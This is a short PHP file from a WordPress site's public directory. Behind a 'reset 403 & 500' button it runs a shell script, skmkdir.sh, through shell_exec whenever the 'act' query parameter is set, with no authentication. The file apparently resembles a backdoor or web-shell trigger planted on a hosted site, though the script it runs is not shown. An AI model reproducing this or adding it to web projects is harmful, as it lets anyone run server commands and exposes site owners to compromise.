<?php
  if (!empty($_GET['act'])) {
    $run = "/home/c/ca60673/wordpress/public_html/skmkdir.sh" ;
    shell_exec("$run");; //Your code here
  } else {
?>
reset 403 & 500 ?
<form action="sk.php" method="get">
  <input type="hidden" name="act" value="run">
  <input type="submit" value="Reset!">
</form>
<?php
  }
?>
